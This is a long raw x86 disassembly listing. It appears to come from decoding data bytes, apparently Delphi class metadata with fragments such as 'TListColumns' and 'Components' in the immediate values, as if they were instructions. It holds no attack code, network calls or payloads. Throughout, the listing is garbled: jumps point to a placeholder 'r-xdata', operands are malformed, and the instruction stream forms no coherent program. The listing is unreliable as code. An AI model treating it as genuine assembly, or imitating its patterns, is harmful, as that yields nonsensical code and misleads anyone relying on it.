dec ecx
jb r-xdata
add eax [ edx ]
cmp [ cs : ecx ] eax
call 0x3440eb3
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] bh
push ds
inc esp
add [ ebx ] cl
push esp
inc eax
add ah ch
int3
outsb
imul ebp [ edi + 0x6e ] r-xdata
add ah bl
xor [ eax ] eax
and al 0x1e
inc esp
push es
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax - 0x35 ]
inc ebx
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
push ebx
outsd
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
je r-xdata
outsb
jb r-xdata
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
jb r-xdata
or [ ebx + edx * 2 + 0x6f ] edx
outsd
je r-xdata
insb
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
jae r-xdata
outsd
insd
inc esp
jb r-xdata
outsd
insd
inc ebx
je r-xdata
je r-xdata
push esp
js r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
push esp
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
jae r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
call 0xc4410d6
jne r-xdata
imul ebp [ edi + 0x6e ] 0x6d726f46
add [ ebx ] al
push cs
push esp
push ebp
inc esp
dec edi
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsd
outsb
mov ah cl
inc ebx
add [ esi ] cl
jae r-xdata
insb
jae r-xdata
inc eax
add [ eax - 0x34 ] dh
inc ebx
add [ eax ] al
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add [ eax - 0x34 ] bh
inc ebx
add [ eax + eax ] al
add [ eax ] al
and [ ecx ] dl
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
outsb
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
insb
add [ ebx ] al
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
outsd
outsb
int3
push es
inc eax
add [ gs : eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
dec eax
outsd
jb r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
push ebp
inc esp
inc ecx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
nop
mov al 0xcc
inc ebx
add [ ebx ] al
push cs
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
outsd
outsb
inc esi
outsd
jb r-xdata
je r-xdata
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
inc eax

je r-xdata
inc ebp
push esp
jns r-xdata
push 0x65
int 0x43
add [ gs : ecx + edx + 0x40 ] dh
add [ ecx * 8 + 0x408d0043 ] ch
add ah ch
int 0x43
add [ eax ] cl
adc [ ebp + edx * 2 + 0x44 ] dl
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
outsb
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
imul ebp [ esi + 0x67 ] 0x6e657645
dec esi
outsd
outsb
add eax 0x55647075
jo r-xdata
add [ edi ] al
jne r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
pushad
int 0x43
jpe r-xdata
or [ ebx + 0x6f ] al
jne r-xdata
inc edx
jne r-xdata
jae r-xdata
int3
popad
je r-xdata
enter 0x43cb 0x0
push es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
push ebx
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
0x43
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
je r-xdata
inc ebx
je r-xdata
outsb
add cl [ eax ]
push es
push ebx
outsb
or [ ebx + 0x6f ] al
jne r-xdata
inc ebx
outsb
je r-xdata
jbe r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx * 8 + 0x62060043 ] ch
je r-xdata
insd
inc ebx
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x6f430874
jae r-xdata
outsd
add [ ebx ] ecx
inc ecx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
inc eax
add [ eax - 0x33 ] ah
inc ebx
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xd0
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
outsb
inc ebp
add ah al
iretd
popad
insb
jne r-xdata
add [ ebx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0xb ] si
insb
jae r-xdata
jb r-xdata
outsb
inc esp
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x33 ] ah
insb
or dh [ ebp + 0x64 ]
push esi
jb r-xdata
int 0x43
inc ebx
insd
inc ebx
je r-xdata
outsd
js r-xdata
inc eax
add [ eax + edx ] bh
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] cl
dec esi
ja r-xdata
outsb
adc [ ebp + edx * 2 + 0x70 ] dl
inc esp
outsd
ja r-xdata
js r-xdata
inc edx
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
or [ ebx + 0x6d ] dl
popad
insb
insb
imul ebp [ esi + 0x74 ] 0x69440900
jb r-xdata
insb
outsd
ja r-xdata
or eax [ ecx + 0x6c ]
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
adc [ eax ] al
mov eax eax
xor al 0xce
inc ebx
add [ eax ] cl
adc dl [ ebp + edx * 2 + 0x44 ]
inc ebx
push 0x69676e61
inc ebx
add [ ebx ] al
or dl [ ebp + edx * 2 + 0x44 ]
inc edx
je r-xdata
shr [ eax + 0x80043cd ] 0xd
push esp
jb r-xdata
pop es
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
arpl [ eax + eax + 0x6 ] si
bound ebp [ edx + 0x65 ]
push es
bound esi [ eax + edx * 2 + 0x72 ]
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
add al bl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
adc [ eax ] al
cmp al 0x10
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ 0xffffffff833c0044 ] ah
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + ebx + 0x44 ] cl
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
inc ebx
add [ eax ] cl
or eax 0x43445554
push esp
jns r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc ebx
insb
jae r-xdata
rcl [ ebp + eax * 2 + 0x441fac00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ edi ] al
add [ esi ] bh
mov al 0x4e
mov esp 0x5bd14
adc eax 0xb2ffb3bd
jmp [ eax ]
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
push ebp
inc esp
inc ebx
add [ esi ] al
push esp
dec edi
insb
imul esp [ edi + 0x6e ] 0x74747542
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ecx * 8 + 0x75060043 ] ch
dec esp
je r-xdata
shl [ eax ] 0xcd
sub_43d591
aad 0x43
add [ esi + edx * 8 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
salc
inc ebx
add [ eax ] dh
add [ eax ] al
add [ eax ] ch
push 0x34340041
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x43ffbbd7 ] al
xchg esp eax
inc ecx
add al ah
sub [ eax + eax - 0x3c ] eax
sub eax 0x2e380044
inc esp
add [ eax + ebx * 4 + 0x2bf00041 ] dh
inc esp
add ah bl
cwde
inc ecx
add al bl
sub [ eax + eax + 0xe ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
in al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
jmp [ eax + 0x100442c ]
inc ebx
outsd
insb
jne r-xdata
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
add bh bh
mov al [ 0x100442c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
outsb
mov eax eax
adc al 0xd6
inc ebx
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
insb
aad 0x43
add al cl
sub al 0x44
add ah bh
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
xchg esp eax
sub eax 0x10044
popad
jo r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
push esp
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
sub al 0x44
add ah dh
sub al 0x44
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
aad 0x43
add [ eax + eax ] dl
add bh bh
movsb [ edi ] [ esi ]
sub eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
or [ ebp + 0x61 ] cl
js r-xdata
add [ eax ] al
outsb
rcl ch 0x1
inc ebx
add [ eax + ebp * 2 + 0x80041 ] dh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add [ esi + ebp - 0x659bffbc ] bh
inc ecx
add al ah
0x10041 0xffff
mov eax 0xc00442e
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
jae r-xdata
xlat
inc ebx
add [ ecx + ebp * 2 + 0x41 ] cl
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edx * 8 - 0x283bffbd ] bh
inc ebx
add [ eax + eax ] bl
add [ eax ] al
loopne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
jae r-xdata
inc eax
add al bl
xlat
inc ebx
add [ edi ] al
or al 0x54
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom st7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb [ eax ] al
add bh bh
mov ah 0x2d
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
call [ ebp + ebp + 0x10044 ]
insb
jae r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
insb
jae r-xdata
[ eax ]
add [ esi + ebx * 2 ] dh
inc ecx
add [ eax + eax ] cl
add bh bh
sub [ 0x10044 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0x60ff0000 ] cl
sub eax 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
inc ecx
add ah al
xchg esp eax
inc ecx
add [ ecx + edi + 0x44 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
and al 0x0
add [ eax ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
fadd [ ebx ]
je r-xdata
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
aad 0x43
add [ eax ] bl
add [ eax ] al
push [ ebp + ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov esp 0xc4004194
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
dec ecx
je r-xdata
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x28 ] ah
inc ebx
add [ eax + eax ] ch
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esp + esi - 0x6b43ffbc ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
cld
fadd [ ebx ]
pop es
or dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
aas
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
cmp eax [ eax + eax - 0x44 ]
xchg esp eax
inc ecx
je r-xdata
insd
add ah al
insd
dec eax
fadd [ ebx ]
clc
inc cx
add [ eax ] al
je r-xdata
insb
jae r-xdata
add [ eax ] ah
xor [ eax + eax - 0x4c ] al
cwde
inc ecx
add ah ah
cwde
inc ecx
add [ eax + esi ] dh
inc esp
add ah bl
das
inc esp
dec ecx
xor al 0x40
je r-xdata
inc esp
add ah dl
add al ah
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
fadd [ ebx ]
adc [ eax ] al
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x3b ] cl
inc esp
add [ esp + edx * 4 + 0x3fc40041 ] bh
add [ eax + 0x60004031 ] ah
cdq
inc ecx
jb r-xdata
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add al bl
xchg ebx eax
inc ecx
insd
jae r-xdata
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xdb
inc ecx
jb r-xdata
test [ ecx ] dh
inc eax
popad
lodsb [ esi ]
fld [ ebx ]
pop es
or [ edi + edx * 2 + 0x6f ] edx
jb r-xdata
inc esp
add [ edx ] cl
push esp
dec esp
fadd [ ebx ]
clc
inc cx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0xdb
inc ebx
add [ edi ] al
inc eax
add ah bh
popad
jae r-xdata
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ eax - 0x62 ] al
inc ecx
add ah dh
popfd
inc ecx
add [ eax + esi + 0x44 ] dh
add [ edx + ebx * 4 + 0x41 ] ah
inc ecx
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
sbb al 0x0
add [ eax ] al
or [ edi + edx * 2 + 0x6f ] edx
jb r-xdata
insb
jae r-xdata
lea eax [ eax ]
add ah bl
inc ebx
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edx ] cl
add [ eax ] al
jmp [ ebp + eax * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or [ edi + 0x72 ] dl
imul ebp [ edi + 0x6e ] 0x43dafc73
add al bh
inc cx
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
push eax
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
fiadd [ ebx ]
sbb al 0x0
add [ eax ] al
mov ah 0x69
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
push eax
fiadd [ ebx ]
add ah al
xchg esp eax
popad
insb
fld [ ebx ]
mov ah 0x68
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
inc ecx
add [ ebp - 0x2693ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x2653ffbd ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x240043d9 ] bl
add [ eax ] al
add [ eax ] ch
push 0x34340041
inc eax
push ebx
je r-xdata
je r-xdata
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x74 ]
insd
js r-xdata
je r-xdata
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
fild [ ebx ]
or al 0x0
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
inc ecx
jb r-xdata
add al ah
0x540a0041 0x6f57
jb r-xdata
inc ecx
insb
jae r-xdata
add [ eax + 0x60043dc ] bh
je r-xdata
add esp edi
add [ eax ] eax
add [ eax ] al
add [ 0xfffffffffc000000 ] al
jae r-xdata
mov eax eax
mov ah 0xdb
inc ebx
add [ ebx ] al
or dl [ esi + edx * 2 + 0x69 ]
ja r-xdata
jb r-xdata
shl [ ebx + ebx * 8 + 0xa030043 ] 0x54
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
inc ebx
add [ eax ] cl
add [ eax ] al
add [ edx + ebx * 8 + 0x43 ] dh
add [ ebx + ebx * 8 ] bl
popad
jae r-xdata
add [ eax ] bl
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
imul ebp [ esi + 0x67 ] 0x4566690d
js r-xdata
imul esp [ esi + 0x44 ] 0xf617461
imul esp [ esi + 0x50 ] 0x69747261
popad
insb
push ebx
je r-xdata
jae r-xdata
or [ ebx + 0x6f ] al
inc ebx
add [ ebx ] al
or edx [ ecx + ecx * 2 + 0x74 ]
insd
jb r-xdata
dec ecx
je r-xdata
jne r-xdata
fild [ ebx ]
push es
imul esi [ ebx + 0x4e ] 0x5656e6f
imul esi [ ebx + 0x43 ] 0x690d7475
jae r-xdata
add [ eax ] al
add eax 0xfc000000
je r-xdata
popad
jo r-xdata
jae r-xdata
insb
dec ecx
arpl [ edi + 0x6e ] bp
or esi [ esi + 0x73 ]
push ebx
insd
popad
insb
insb
dec ecx
arpl [ edi + 0x6e ] bp
push es
jbe r-xdata
fiadd [ ebx ]
add edx [ eax ]
push esp
dec ecx
arpl [ edi + 0x6e ] bp
fiadd [ ebx ]
inc esp
push 0x41
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
outsd
je r-xdata
jae r-xdata
insb
insb
arpl [ ebx + edx * 2 + 0x74 ] si
jb r-xdata
fild [ ebx ]
cld
insb
jae r-xdata
adc [ ebx + edx * 2 + 0x65 ] dl
popad
pop es
arpl [ ecx + ecx * 2 + 0x6d ] si
popad
pop es
arpl [ ebx + edx * 2 + 0x74 ] si
popad
je r-xdata
js r-xdata
jo r-xdata
insd
js r-xdata
or eax 0x72447369
outsd
arpl [ gs : ebp + 0x64 ] si
or al 0x69
jae r-xdata
inc esi
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60043db ] dh
jbe r-xdata
insb
add al [ eax ]
add [ eax ] al
js r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x52737608
jo r-xdata
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ esp + edx * 2 ] cl
dec ecx
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
mov al [ 0xffffffffac004031 ]
xchg ebx eax
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
popad
outsb
insd
outsb
je r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah al
xchg esp eax
insb
jae r-xdata
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x45 ]
jb r-xdata
or eax 0x78456669
inc eax
add [ ebp + ebx * 8 + 0x43 ] ah
add [ ebx ] al
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
insb
fld [ fs : ebx ]
add edx [ edx ]
outsb
or [ bx + di + 0x66 ] ebp
dec esi
popad
jb r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
fadd [ fs : ebx ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
pushad
fld [ ebx ]
or ebp [ eax + 0x74 ]
dec eax
popad
outsb
push 0x65726944
jb r-xdata
push esp
push ebx
popad
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
mov eax eax
jl r-xdata
imul ebp [ ecx + ebp * 2 + 0x74 ] 0x69096465
jae r-xdata
inc ebx
add [ esi ] al
arpl [ esp + edx * 2 + 0x65 ] si
or [ ecx + ecx * 2 + 0x74 ] edx
insd
insd
inc ebx
je r-xdata
outsb
or [ bp + di + 0x6f ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
je r-xdata
inc ecx
jb r-xdata
add [ ebp - 0x2587ffc0 ] cl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x44 ]
insb
je r-xdata
dec eax
outsd
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insb
jae r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x54746f48
jae r-xdata
insd
insb
jae r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x646c6f43
push cs
jb r-xdata
dec esp
je r-xdata
add [ eax + eax ] al
insb
jae r-xdata
push esp
dec ecx
je r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ch [ fs : ecx + 0x73 ]
push ebx
push es
or edx [ ecx + ecx * 2 + 0x74 ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
imul esp [ ecx + 0x4c ] 0x8746665
inc ebx
outsd
add [ eax ] al
lea eax [ eax ]
js r-xdata
add [ 0x6f546169 ] al
jo r-xdata
inc ebx
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
inc ebp
jbe r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x54746f48
jb r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul esi [ fs : edi + eax + 0x42 ] 0x656c6f6f
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
fld [ ebx ]
mov eax eax
loopne r-xdata
pushad
outsb
je r-xdata
push eax
outsd
imul ebp [ esi + 0x74 ] 0x5574680f
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc eax
add [ eax ] al
fadd [ ebx ]
add ecx [ edx ]
push esp
dec ecx
je r-xdata
inc ebx
add [ eax ] al
adc [ eax ] al
nop
js r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x65764567
outsb
inc eax
imul ebp [ esi + 0x65 ] 0x8746f48
pop es
jae r-xdata
jae r-xdata
insb
sar [ esp + ebx * 8 + 0x9030043 ] 0x54
dec ecx
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x24 ] bh
insd
or al 0x54
dec ecx
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
insb
jae r-xdata
pop es
or dl [ edi + edx * 2 + 0x6f ]
jb r-xdata
inc ebx
add [ ebx ] al
adc [ ecx + ecx * 2 + 0x63 ] dl
outsd
outsb
push es
push ebx
je r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc eax
add [ ecx ] ecx
inc ecx
insb
insd
insb
outsd
ja r-xdata
or [ ecx + 0x6c ] eax
add [ eax + r-xdata ] dl
or [ eax ] dl
push esp
dec ecx
je r-xdata
inc ebx
add al al
fld [ ebx ]
push es
inc ebx
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edx ] al
add [ eax ] al
add [ eax - 0x23 ] ah
inc ebx
add [ ebx ] cl
push 0x6e614874
insb
jae r-xdata
push ebx
je r-xdata
insd
inc ebp
jbe r-xdata
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x6e657645
insb
jae r-xdata
outsb
jb r-xdata
inc ecx
